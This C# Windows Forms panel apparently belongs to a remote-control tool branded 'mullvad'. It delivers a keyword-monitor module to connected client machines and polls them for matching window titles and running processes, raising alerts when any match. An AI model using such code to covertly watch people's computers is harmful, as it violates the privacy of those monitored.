using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms
{
    internal sealed class KeywordsPanel : Form
    {
        private readonly Dictionary<string, ClientHandler> _handlers;

        private ToolStrip           _toolbar      = null!;
        private SplitContainer      _split        = null!;
        private ListView            _lvAlerts     = null!;
        private ListView            _lvKeywords   = null!;
        private ListView            _lvApps       = null!;
        private ToolStripButton     _btnAddKw     = null!;
        private ToolStripButton     _btnRemoveKw  = null!;
        private ToolStripButton     _btnAddApp    = null!;
        private ToolStripButton     _btnRemoveApp = null!;
        private ToolStripButton     _btnClear     = null!;
        private ContextMenuStrip    _ctxKeywords  = null!;
        private ContextMenuStrip    _ctxApps      = null!;

        private readonly List<string> _keywords    = new();
        private readonly List<string> _watchedApps = new();

        private const string KwModuleFile = "mullvad.Module.KeywordMonitor";
        private const string KwModuleId   = "mullvad.kwmonitor";

        private readonly Dictionary<string, CancellationTokenSource> _monitorCts = new();
        private readonly Dictionary<string, ModuleContext>           _monitorCtx = new();
        private readonly HashSet<string> _alertedKeys = new();

        public KeywordsPanel(Dictionary<string, ClientHandler> handlers)
        {
            _handlers = handlers;
            Build();
        }

        private void Build()
        {
            SuspendLayout();

            Text      = "Keywords";
            BackColor = ThemeManager.ControlColor;
            ForeColor = ThemeManager.ForeColor;

            // ── Toolbar ──────────────────────────────────────────────────────────
            _toolbar = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Dock = DockStyle.Top };

            _btnAddKw     = new ToolStripButton("Add Keyword")        { DisplayStyle = ToolStripItemDisplayStyle.Text };
            _btnRemoveKw  = new ToolStripButton("Remove Keyword")     { DisplayStyle = ToolStripItemDisplayStyle.Text };
            _btnAddApp    = new ToolStripButton("Add Application")    { DisplayStyle = ToolStripItemDisplayStyle.Text };
            _btnRemoveApp = new ToolStripButton("Remove Application") { DisplayStyle = ToolStripItemDisplayStyle.Text };
            _btnClear     = new ToolStripButton("Clear Alerts")       { DisplayStyle = ToolStripItemDisplayStyle.Text };

            TrySetToolIcon(_btnAddKw,     "done.png");
            TrySetToolIcon(_btnRemoveKw,  "delete.png");
            TrySetToolIcon(_btnAddApp,    "application.png");
            TrySetToolIcon(_btnRemoveApp, "cancel.png");
            TrySetToolIcon(_btnClear,     "refresh.png");

            _btnAddKw.Click     += BtnAddKeyword_Click;
            _btnRemoveKw.Click  += BtnRemoveKeyword_Click;
            _btnAddApp.Click    += BtnAddApp_Click;
            _btnRemoveApp.Click += BtnRemoveApp_Click;
            _btnClear.Click     += (_, _) => { _lvAlerts.Items.Clear(); _alertedKeys.Clear(); };

            _toolbar.Items.AddRange(new ToolStripItem[]
            {
                _btnAddKw, _btnRemoveKw,
                new ToolStripSeparator(),
                _btnAddApp, _btnRemoveApp,
                new ToolStripSeparator(),
                _btnClear,
            });

            // ── Context menus for Keywords / Applications ──────────────────────────
            _ctxKeywords = BuildListContextMenu(
                "Keyword",
                () => BtnAddKeyword_Click(null, EventArgs.Empty),
                () => BtnRemoveKeyword_Click(null, EventArgs.Empty),
                () => { _keywords.Clear(); _lvKeywords.Items.Clear(); });

            _ctxApps = BuildListContextMenu(
                "Application",
                () => BtnAddApp_Click(null, EventArgs.Empty),
                () => BtnRemoveApp_Click(null, EventArgs.Empty),
                () => { _watchedApps.Clear(); _lvApps.Items.Clear(); });

            // ── Main split: config (top) | alerts (bottom) ───────────────────────
            _split = new SplitContainer
            {
                Dock            = DockStyle.Fill,
                Orientation     = Orientation.Horizontal,
                SplitterDistance = 140,
            };

            // ── Top: Keywords + Applications side by side ─────────────────────────
            var configSplit = new SplitContainer
            {
                Dock            = DockStyle.Fill,
                Orientation     = Orientation.Vertical,
                SplitterDistance = 300,
            };

            var lblKw = new Label
            {
                Text      = "Watched Keywords",
                Dock      = DockStyle.Top,
                Height    = 22,
                TextAlign = ContentAlignment.MiddleLeft,
                Padding   = new Padding(6, 0, 0, 0),
                Font      = new Font("Segoe UI", 9F, FontStyle.Bold),
            };

            _lvKeywords = new ListView
            {
                Dock             = DockStyle.Fill,
                View             = View.Details,
                FullRowSelect    = true,
                GridLines        = false,
                MultiSelect      = false,
                Font             = new Font("Segoe UI", 9F),
                ContextMenuStrip = _ctxKeywords,
            };
            _lvKeywords.Columns.Add("Keyword", 250);
            _lvKeywords.OwnerDraw = true;
            _lvKeywords.DrawColumnHeader += (s, e) => e.DrawDefault = true;
            _lvKeywords.DrawItem         += (s, e) => e.DrawDefault = false;
            _lvKeywords.DrawSubItem      += DrawSubItem;

            var kwPanel = new Panel { Dock = DockStyle.Fill };
            kwPanel.Controls.Add(_lvKeywords);
            kwPanel.Controls.Add(lblKw);
            configSplit.Panel1.Controls.Add(kwPanel);

            var lblApps = new Label
            {
                Text      = "Watched Applications",
                Dock      = DockStyle.Top,
                Height    = 22,
                TextAlign = ContentAlignment.MiddleLeft,
                Padding   = new Padding(6, 0, 0, 0),
                Font      = new Font("Segoe UI", 9F, FontStyle.Bold),
            };

            _lvApps = new ListView
            {
                Dock             = DockStyle.Fill,
                View             = View.Details,
                FullRowSelect    = true,
                GridLines        = false,
                MultiSelect      = false,
                Font             = new Font("Segoe UI", 9F),
                ContextMenuStrip = _ctxApps,
            };
            _lvApps.Columns.Add("Application", 250);
            _lvApps.OwnerDraw = true;
            _lvApps.DrawColumnHeader += (s, e) => e.DrawDefault = true;
            _lvApps.DrawItem         += (s, e) => e.DrawDefault = false;
            _lvApps.DrawSubItem      += DrawSubItem;

            var appsPanel = new Panel { Dock = DockStyle.Fill };
            appsPanel.Controls.Add(_lvApps);
            appsPanel.Controls.Add(lblApps);
            configSplit.Panel2.Controls.Add(appsPanel);

            _split.Panel1.Controls.Add(configSplit);

            // ── Bottom: Alerts ───────────────────────────────────────────────────
            var lblAlerts = new Label
            {
                Text      = "Alerts",
                Dock      = DockStyle.Top,
                Height    = 22,
                TextAlign = ContentAlignment.MiddleLeft,
                Padding   = new Padding(6, 0, 0, 0),
                Font      = new Font("Segoe UI", 9F, FontStyle.Bold),
            };

            _lvAlerts = new ListView
            {
                Dock          = DockStyle.Fill,
                View          = View.Details,
                FullRowSelect = true,
                GridLines     = false,
                MultiSelect   = false,
                Font          = new Font("Segoe UI", 9F),
            };
            _lvAlerts.Columns.Add("Type",     80);
            _lvAlerts.Columns.Add("Match",    160);
            _lvAlerts.Columns.Add("Computer", 140);
            _lvAlerts.Columns.Add("Time",     150);
            _lvAlerts.Columns.Add("Details",  300);
            _lvAlerts.OwnerDraw = true;
            _lvAlerts.DrawColumnHeader += (s, e) => e.DrawDefault = true;
            _lvAlerts.DrawItem         += (s, e) => e.DrawDefault = false;
            _lvAlerts.DrawSubItem      += DrawSubItem;

            var bottomPanel = new Panel { Dock = DockStyle.Fill };
            bottomPanel.Controls.Add(_lvAlerts);
            bottomPanel.Controls.Add(lblAlerts);
            _split.Panel2.Controls.Add(bottomPanel);

            Controls.Add(_split);
            Controls.Add(_toolbar);

            ResumeLayout(false);
        }

        // ── Add / Remove ─────────────────────────────────────────────────────────

        private void BtnAddKeyword_Click(object? sender, EventArgs e)
        {
            using var dlg = new Form
            {
                Text            = "Add Keyword",
                ClientSize      = new Size(320, 120),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox     = false,
                MinimizeBox     = false,
                StartPosition   = FormStartPosition.CenterParent,
            };
            var lbl = new Label { Text = "Keyword:", Left = 12, Top = 16, AutoSize = true };
            var txt = new TextBox { Left = 12, Top = 36, Width = 292, PlaceholderText = "e.g. Hacker" };
            var btn = new Button { Text = "Add", Left = 224, Top = 76, Width = 80, Height = 28, FlatStyle = FlatStyle.Flat, DialogResult = DialogResult.OK };
            dlg.Controls.AddRange(new Control[] { lbl, txt, btn });
            dlg.AcceptButton = btn;
            ThemeManager.ApplyForm(dlg);
            if (dlg.ShowDialog(this) == DialogResult.OK && !string.IsNullOrWhiteSpace(txt.Text))
                AddKeyword(txt.Text.Trim());
        }

        private void BtnRemoveKeyword_Click(object? sender, EventArgs e)
        {
            if (_lvKeywords.SelectedItems.Count == 0) return;
            var kw = _lvKeywords.SelectedItems[0].Text;
            _keywords.RemoveAll(k => k.Equals(kw, StringComparison.OrdinalIgnoreCase));
            _lvKeywords.SelectedItems[0].Remove();
        }

        private void BtnAddApp_Click(object? sender, EventArgs e)
        {
            using var dlg = new Form
            {
                Text            = "Add Application",
                ClientSize      = new Size(320, 120),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox     = false,
                MinimizeBox     = false,
                StartPosition   = FormStartPosition.CenterParent,
            };
            var lbl = new Label { Text = "Application name:", Left = 12, Top = 16, AutoSize = true };
            var txt = new TextBox { Left = 12, Top = 36, Width = 292, PlaceholderText = "e.g. notepad.exe" };
            var btn = new Button { Text = "Add", Left = 224, Top = 76, Width = 80, Height = 28, FlatStyle = FlatStyle.Flat, DialogResult = DialogResult.OK };
            dlg.Controls.AddRange(new Control[] { lbl, txt, btn });
            dlg.AcceptButton = btn;
            ThemeManager.ApplyForm(dlg);
            if (dlg.ShowDialog(this) == DialogResult.OK && !string.IsNullOrWhiteSpace(txt.Text))
                AddApp(txt.Text.Trim());
        }

        private void BtnRemoveApp_Click(object? sender, EventArgs e)
        {
            if (_lvApps.SelectedItems.Count == 0) return;
            var app = _lvApps.SelectedItems[0].Text;
            _watchedApps.RemoveAll(a => a.Equals(app, StringComparison.OrdinalIgnoreCase));
            _lvApps.SelectedItems[0].Remove();
        }

        private void AddKeyword(string keyword)
        {
            if (_keywords.Any(k => k.Equals(keyword, StringComparison.OrdinalIgnoreCase)))
                return;
            _keywords.Add(keyword);
            _lvKeywords.Items.Add(new ListViewItem(keyword));
        }

        private void AddApp(string appName)
        {
            if (_watchedApps.Any(a => a.Equals(appName, StringComparison.OrdinalIgnoreCase)))
                return;
            _watchedApps.Add(appName);
            _lvApps.Items.Add(new ListViewItem(appName));
        }

        // ── Detection (called from Form1 on sys-info poll ticks) ─────────────────

        public void CheckKeywords(string computer, string windowTitle)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { BeginInvoke(() => CheckKeywords(computer, windowTitle)); return; }
            if (string.IsNullOrWhiteSpace(windowTitle)) return;

            foreach (var kw in _keywords)
            {
                if (windowTitle.Contains(kw, StringComparison.OrdinalIgnoreCase))
                {
                    string alertKey = computer + "|kw|" + kw.ToLowerInvariant();
                    if (!_alertedKeys.Add(alertKey)) continue;

                    var item = new ListViewItem("Keyword");
                    item.SubItems.Add(kw);
                    item.SubItems.Add(computer);
                    item.SubItems.Add(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    item.SubItems.Add(windowTitle);
                    _lvAlerts.Items.Insert(0, item);
                }
            }
        }

        public void CheckApplication(string computer, string processName)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { BeginInvoke(() => CheckApplication(computer, processName)); return; }
            if (string.IsNullOrWhiteSpace(processName)) return;

            foreach (var app in _watchedApps)
            {
                if (processName.Contains(app, StringComparison.OrdinalIgnoreCase))
                {
                    string alertKey = computer + "|ap|" + app.ToLowerInvariant();
                    if (!_alertedKeys.Add(alertKey)) continue;

                    var item = new ListViewItem("Application");
                    item.SubItems.Add(app);
                    item.SubItems.Add(computer);
                    item.SubItems.Add(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    item.SubItems.Add(processName);
                    _lvAlerts.Items.Insert(0, item);
                }
            }
        }

        public IReadOnlyList<string> Keywords    => _keywords;
        public IReadOnlyList<string> WatchedApps => _watchedApps;

        // ── Module-based monitoring for all connected clients ────────────────────

        public void StartMonitoring(ClientHandler handler)
        {
            if (IsDisposed) return;
            var id = handler.Info.Id;
            if (_monitorCts.ContainsKey(id)) return;

            var cts = new CancellationTokenSource();
            _monitorCts[id] = cts;
            _ = MonitorLoopAsync(handler, cts.Token);
        }

        public void StopMonitoring(string clientId)
        {
            if (_monitorCts.TryGetValue(clientId, out var cts))
            {
                cts.Cancel();
                cts.Dispose();
                _monitorCts.Remove(clientId);
            }
            if (_monitorCtx.TryGetValue(clientId, out var ctx))
            {
                try { ctx.Dispose(); } catch { }
                _monitorCtx.Remove(clientId);
            }
        }

        public void StartMonitoringAll()
        {
            foreach (var kv in _handlers)
                StartMonitoring(kv.Value);
        }

        private async Task MonitorLoopAsync(ClientHandler handler, CancellationToken ct)
        {
            try
            {
                var bytes = ModuleLoader.GetModuleBytes(KwModuleFile);
                if (bytes is null) return;

                using var dcts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                dcts.CancelAfter(TimeSpan.FromSeconds(60));
                bool ok = await ModuleDelivery.EnsureDeliveredAsync(
                    handler, KwModuleFile, bytes, null, dcts.Token).ConfigureAwait(false);
                if (!ok || ct.IsCancellationRequested) return;

                var ctx = new ModuleContext(handler, KwModuleId);
                _monitorCtx[handler.Info.Id] = ctx;

                handler.Disconnected += _ => StopMonitoring(handler.Info.Id);

                while (!ct.IsCancellationRequested)
                {
                    try { await Task.Delay(5000, ct).ConfigureAwait(false); }
                    catch { break; }

                    List<string> kwSnap, appSnap;
                    if (InvokeRequired)
                    {
                        (kwSnap, appSnap) = ((List<string>, List<string>))Invoke(
                            () => (_keywords.ToList(), _watchedApps.ToList()));
                    }
                    else
                    {
                        kwSnap  = _keywords.ToList();
                        appSnap = _watchedApps.ToList();
                    }

                    if (kwSnap.Count == 0 && appSnap.Count == 0) continue;

                    string payload = BuildScanPayload(kwSnap, appSnap);

                    string json;
                    using (var scts = CancellationTokenSource.CreateLinkedTokenSource(ct))
                    {
                        scts.CancelAfter(TimeSpan.FromSeconds(10));
                        try { json = await ctx.ExecuteAsync("scan", payload, scts.Token).ConfigureAwait(false); }
                        catch { continue; }
                    }

                    ProcessScanResult(handler.Info.Computer, handler.Info.Id, json);
                }
            }
            catch (OperationCanceledException) { }
            catch { }
        }

        private static string BuildScanPayload(List<string> keywords, List<string> apps)
        {
            var sb = new System.Text.StringBuilder(256);
            sb.Append("{\"keywords\":[");
            for (int i = 0; i < keywords.Count; i++)
            {
                if (i > 0) sb.Append(',');
                sb.Append('"').Append(keywords[i].Replace("\\", "\\\\").Replace("\"", "\\\"")).Append('"');
            }
            sb.Append("],\"apps\":[");
            for (int i = 0; i < apps.Count; i++)
            {
                if (i > 0) sb.Append(',');
                sb.Append('"').Append(apps[i].Replace("\\", "\\\\").Replace("\"", "\\\"")).Append('"');
            }
            sb.Append("]}");
            return sb.ToString();
        }

        private void ProcessScanResult(string computer, string clientId, string json)
        {
            if (IsDisposed || string.IsNullOrEmpty(json)) return;

            var kwMatches  = ParseMatchArray(json, "kw",  "k", "w");
            var appMatches = ParseMatchArray(json, "ap",  "a", "p");

            if (kwMatches.Count == 0 && appMatches.Count == 0) return;

            BeginInvoke(() =>
            {
                if (IsDisposed) return;

                foreach (var (match, detail) in kwMatches)
                {
                    string key = clientId + "|kw|" + match.ToLowerInvariant();
                    if (!_alertedKeys.Add(key)) continue;

                    var item = new ListViewItem("Keyword");
                    item.SubItems.Add(match);
                    item.SubItems.Add(computer);
                    item.SubItems.Add(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    item.SubItems.Add(detail);
                    _lvAlerts.Items.Insert(0, item);
                    ToastNotification.Show("Keyword Alert", $"\"{match}\" detected on {computer}");
                }

                foreach (var (match, detail) in appMatches)
                {
                    string key = clientId + "|ap|" + match.ToLowerInvariant();
                    if (!_alertedKeys.Add(key)) continue;

                    var item = new ListViewItem("Application");
                    item.SubItems.Add(match);
                    item.SubItems.Add(computer);
                    item.SubItems.Add(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    item.SubItems.Add(detail);
                    _lvAlerts.Items.Insert(0, item);
                    ToastNotification.Show("Application Alert", $"\"{match}\" running on {computer}");
                }
            });
        }

        private static List<(string match, string detail)> ParseMatchArray(
            string json, string arrayKey, string matchKey, string detailKey)
        {
            var result = new List<(string, string)>();
            string needle = "\"" + arrayKey + "\"";
            int idx = json.IndexOf(needle, StringComparison.Ordinal);
            if (idx < 0) return result;
            int bracket = json.IndexOf('[', idx);
            if (bracket < 0) return result;
            int endBracket = FindMatchingBracket(json, bracket);
            if (endBracket < 0) return result;

            string inner = json.Substring(bracket + 1, endBracket - bracket - 1);
            int pos = 0;
            while (pos < inner.Length)
            {
                int objStart = inner.IndexOf('{', pos);
                if (objStart < 0) break;
                int objEnd = inner.IndexOf('}', objStart);
                if (objEnd < 0) break;
                string obj = inner.Substring(objStart, objEnd - objStart + 1);

                string m = ExtractJsonString(obj, matchKey)  ?? "";
                string d = ExtractJsonString(obj, detailKey) ?? "";
                if (m.Length > 0) result.Add((m, d));

                pos = objEnd + 1;
            }
            return result;
        }

        private static int FindMatchingBracket(string s, int open)
        {
            int depth = 0;
            for (int i = open; i < s.Length; i++)
            {
                if (s[i] == '[') depth++;
                else if (s[i] == ']') { depth--; if (depth == 0) return i; }
            }
            return -1;
        }

        private static string? ExtractJsonString(string json, string key)
        {
            string needle = "\"" + key + "\"";
            int idx = json.IndexOf(needle, StringComparison.Ordinal);
            if (idx < 0) return null;
            int colon = json.IndexOf(':', idx + needle.Length);
            if (colon < 0) return null;
            int qs = json.IndexOf('"', colon + 1);
            if (qs < 0) return null;
            var sb = new System.Text.StringBuilder();
            for (int i = qs + 1; i < json.Length; i++)
            {
                if (json[i] == '\\' && i + 1 < json.Length) { sb.Append(json[++i]); continue; }
                if (json[i] == '"') break;
                sb.Append(json[i]);
            }
            return sb.ToString();
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            foreach (var cts in _monitorCts.Values)
            {
                cts.Cancel();
                cts.Dispose();
            }
            _monitorCts.Clear();
            foreach (var ctx in _monitorCtx.Values)
                try { ctx.Dispose(); } catch { }
            _monitorCtx.Clear();
            base.OnFormClosed(e);
        }

        // ── Context menu builder ─────────────────────────────────────────────────

        private static ContextMenuStrip BuildListContextMenu(
            string label, Action onAdd, Action onRemove, Action onRemoveAll)
        {
            var ctx = new ContextMenuStrip();

            var miAdd = new ToolStripMenuItem($"Add {label}");
            IconLoader.SetIcon(miAdd, "done.png");
            miAdd.Click += (_, _) => onAdd();

            var miRemove = new ToolStripMenuItem($"Remove {label}");
            IconLoader.SetIcon(miRemove, "delete.png");
            miRemove.Click += (_, _) => onRemove();

            var miRemoveAll = new ToolStripMenuItem("Remove All");
            IconLoader.SetIcon(miRemoveAll, "cancel.png");
            miRemoveAll.Click += (_, _) => onRemoveAll();

            ctx.Items.AddRange(new ToolStripItem[] { miAdd, miRemove, new ToolStripSeparator(), miRemoveAll });

            ctx.Opening += (_, e) =>
            {
                miRemove.Enabled = ctx.SourceControl is ListView lv && lv.SelectedItems.Count > 0;
                miRemoveAll.Enabled = ctx.SourceControl is ListView lv2 && lv2.Items.Count > 0;
            };

            return ctx;
        }

        // ── Draw helper ──────────────────────────────────────────────────────────

        private static void DrawSubItem(object? sender, DrawListViewSubItemEventArgs e)
        {
            var lv = (ListView)sender!;
            bool selected = e.Item!.Selected && lv.Focused;
            var bg = selected ? SystemColors.Highlight : lv.BackColor;
            var fg = selected ? SystemColors.HighlightText : lv.ForeColor;
            using var bgBrush = new SolidBrush(bg);
            e.Graphics.FillRectangle(bgBrush, e.Bounds);
            var tf = new StringFormat { LineAlignment = StringAlignment.Center, Trimming = StringTrimming.EllipsisCharacter };
            using var fgBrush = new SolidBrush(fg);
            var rect = e.Bounds;
            rect.X += 4;
            e.Graphics.DrawString(e.SubItem!.Text, lv.Font, fgBrush, rect, tf);
        }

        private static void TrySetToolIcon(ToolStripButton btn, string filename)
        {
            var img = IconLoader.Load(filename);
            if (img != null) { btn.Image = img; btn.DisplayStyle = ToolStripItemDisplayStyle.ImageAndText; }
        }
    }
}
